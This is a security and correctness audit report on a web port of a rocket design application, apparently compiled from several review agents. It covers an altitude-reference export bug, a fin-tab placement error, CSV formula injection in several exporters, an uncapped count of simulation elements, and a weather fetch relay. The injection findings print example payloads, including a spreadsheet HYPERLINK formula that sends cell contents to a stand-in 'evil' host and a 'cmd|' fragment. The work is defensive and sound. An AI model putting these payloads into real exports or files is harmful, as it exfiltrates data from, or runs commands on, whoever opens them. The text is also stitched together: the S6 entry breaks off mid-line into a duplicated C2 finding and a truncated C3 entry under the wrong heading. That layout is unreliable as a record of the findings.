## How to read the verification tags

- **VERIFIED** means the cited lines were re-read and the claim confirmed
  independently of the agent that raised it, against the Java under
  `engine-java/src/java` (or the desktop handlers) for anything ported or
  written for the desktop to read.
- **CONFIRMED BY REVIEWER** means the review agent read the lines and confirmed
  the claim itself, with a failure scenario, but it was not re-read a second
  time. These are strong leads.
- **REPORTED** means the agent raised it as plausible without fully confirming
  it. Treat these as leads, not facts.
- The tag in brackets after the severity, such as `[1a-H1]`, is the slice
  report's own ID, so each finding can be traced back; `conventions-` marks
  the cross-cutting conventions sweep. Duplicates raised by
  more than one agent are merged into one entry that cites every tag. Line
  numbers are as of 2ad285b.

## The HIGH findings, in short

- **C1. Every `.ork` with a wind profile opens on the desktop as AGL.**
  `exportSimulation.ts:155` writes `altituderef` upper case (`MSL`, `AGL`).
  Desktop writes the lower-case enum name and matches it case-sensitively, so
  it reads null, flies the AGL branch, and throws on its next save.
- **C2. The fin tab "Calculate automatically" button places the fin one root
  chord too far aft.** `finTabAuto.ts` measures the fin set with
  `num(child, 'length')`, and fin sets have no `length` key. On the default
  `bottom` placement the computed tab runs through the motor mount.
- **C3. The Results tab shows two flights at once.** The summary tiles,
  warnings and events table read the active simulation; the charts beside them
  read the flight chosen in the Results picker. Running two ticked rows lands
  in this state without any picking.
- **R1. The published parts and motor catalogs have no digests.** The `data`
  branch copy the live app reads first has 3,444 parts and 1,156 motors, with
  0 digests on either, no rail buttons and none of the parts desktop ships in
  its jar. Every `.ork` saved from the deployed app drops its part links.
- **R2. The "digests fell" guard can never fire.** It counts digests in the
  file the previous step just rewrote without any, so its baseline is always
  0, and nothing else checks digest coverage before the publish step.

## 🔴 Security

### Medium

- **S1** (MED, VERIFIED) [1b-M1] `web/src/services/exports/csvExport.ts:114-118, 127-128`. `flightDataCsv` writes the `# Simulation:` and `# Stage:` comment lines through `clean`, which strips only the chosen separator plus CR/LF. With `;`, tab or space chosen in `FlightCsvDialog`, a name such as `x,=HYPERLINK("http://evil/?"&A1)` from a shared `.ork` keeps its comma; with space chosen nothing is removed at all. The comment at 109-113 says this cannot happen. *Why it matters:* Excel in a comma locale splits a `.csv` on commas whatever separator the file used, so cell B1 is a live formula. Same class as the closed S1, reached through the flight data export. *Fix:* Strip `[,;\t]` from comment text regardless of `o.separator`, as `flightEventsCsv` does at line 256; add a test per separator.
- **S2** (MED, VERIFIED) [1b-M2] `web/src/services/report/reportCsv.ts:35-38`; `web/src/services/exports/csvExport.ts:170, 245-250, 326`; `web/src/services/exports/flightPathExport.ts:1480`. Every CSV writer neutralizes only the first character of a value. In a locale whose list separator is `;` (de, fr, nl, pl, pt, ru, es), a `;` inside a value starts a new, un-neutralized cell; `reportCsv.cell` quotes only on `[",\r\n]`. `aeroTableCsv`'s `compHeader` rewrites `,` to `;` in component names, creating the separator, and its comment says the `Cd_` prefix rules injection out. *Why it matters:* A hostile shared design name executes when the design, aero, run table, events or waypoint CSV is opened in a semicolon-locale Excel, and the app ships nine such locales. *Fix:* Neutralize a trigger that follows `;` or a tab too, or replace `;` and tab in text values; drop the `,` to `;` rewrite and correct its comment.
- **S3** (MED, VERIFIED) [1b-M3] `web/src/services/exports/flightPathExport.ts:1480` with `web/src/services/exports/csvCell.ts:15`. The CSV escaper for the waypoint CSV and every user CSV template passes `keepNumericMinus: true` for all values, text included, so `-1+HYPERLINK(...)` and `-.5+cmd|...` pass untouched (`^-(?![\d.])`). `csvExport.ts:242-244` itself notes that `-1+HYPERLINK(...)` evaluates. *Why it matters:* A user template cell holding only `{{rocketName}}` writes a shared design's name as a live formula, the case `escaperFor` exists to prevent. *Fix:* Keep the minus only when the whole value is a number (`/^-?(\d+\.?\d*|\.\d+)(e[+-]?\d+)?$/i`); neutralize otherwise.
- **S4** (MED, VERIFIED) [1a-M4] `web/src/services/files/ork/importSimulations.ts:34-48`, `web/src/services/files/wireLoadedOrk.ts:70-82`. The number of `<simulation>` elements is not capped. Each one is read (a query, `readSimulationLaunch`, an `XMLSerializer` pass in `readPassthrough`) and becomes a workspace simulation. Every other repeated element has a ceiling in `ork/importLimits.ts`, whose comment says a byte cap does not bound a count. *Why it matters:* `<simulation/>` is 13 bytes, so the 64 MiB member cap admits about five million from a small zip: millions of synchronous DOM passes, store rows, table rows and IndexedDB writes, and a frozen tab. *Fix:* Add `MAX_SIMULATIONS` and refuse the file or keep the first N with a keyed note, as `readPointList` does.
- **S5** (MED, VERIFIED for the hang path, REPORTED for the trigger) [5-S5-3] [4b-S4b-14] `web/src/services/weather/anonymousFetch.ts:102-112` (with `openMeteo.ts:495-526`). No unit test imports this module (41.7% lines, 9.1% branches). It is the sandboxed-frame relay every Open-Meteo request goes through, holding the origin checks (`e.source !== frame.contentWindow`, `e.source !== parent`), the `https://` refusal, cancel and error mapping. `anonymousGet` awaits `frameWindow()` before it attaches the abort listener, and `ready` is cached forever. The response body is read with an uncapped `res.text()`. *Why it matters:* This is the privacy boundary for the weather feature, and a regression in an origin check is silent. If the frame never posts `ready` (a blocked inline script, an extension, a later CSP), the 12 s timeout aborts a signal nobody listens to, and every weather, elevation, terrain and geocoding call hangs for the rest of the session. *Fix:* Race `frameWindow()` against the signal and reset `ready` on failure; cap the text length in the frame script; add a jsdom test with a stub frame covering a foreign-source reply, a non-https URL, abort before and after ready, and network error mapping.

### Low

- **S6** (LOW, REPORTED) [1b-L8] `web/src/services/exports/flightPathExport.ts:1469`; `web/src/services/exports/threeMf.ts:131, 140`. - **C2** (HIGH, VERIFIED) [4b-S4b-1] `web/src/services/design/finTabAuto.ts:43-45` (used at `:166`). `offsetFromTop` places a part with `startFromPosition(positionOf(child), num(child, 'length'), parentLength)`. A planar fin set has no `length` key (its axial length is `rootChord` or the freeform points), so the fin is measured as 0 long. For `bottom` (what `defaultNode` gives every new fin set and what the default rocket uses), the fin's top comes out one root chord too far aft; for `middle`, half a chord. Desktop `FinSetConfig.calculateAutoTab` uses `getAxialOffset(AxialMethod.TOP)`. Probe: 300 mm tube, 200 mm mount at the bottom, rings at 100 mm and the aft end, 100 mm root chord: fins at `bottom/0` give `tabHeight 0.026` (through the mount to the axis); the same fins as `top/0.2` give `0.0165`, the desktop answer. *Why it matters:* The button writes `tabHeight`, `tabLength` and `tabOffset` into the design; the kernel flies the tab and the DXF and print solids cut it. On the default placement the tab runs through the motor tube, and nothing reports it. The one `bottom` test has no mount under the fin, so it passes either way. *Fix:* Measure the fin with `axialLength` from `tree/position.ts`, and use `partLength` for the children. Add a test that `bottom/0` and the equivalent `top` offset give the same patch with a mount under the fin.
- **C3** (HIGH, VERIFIED) [2-S2-H1] `web/src/App.tsx:44,47,264-269`; `web/src/components/canvas/CenterView.tsx:46,87-89`. `SimSummary`, `FlightWarnings` and `FlightEventsTable` (and its CSV) read `selectActive(s).result`.
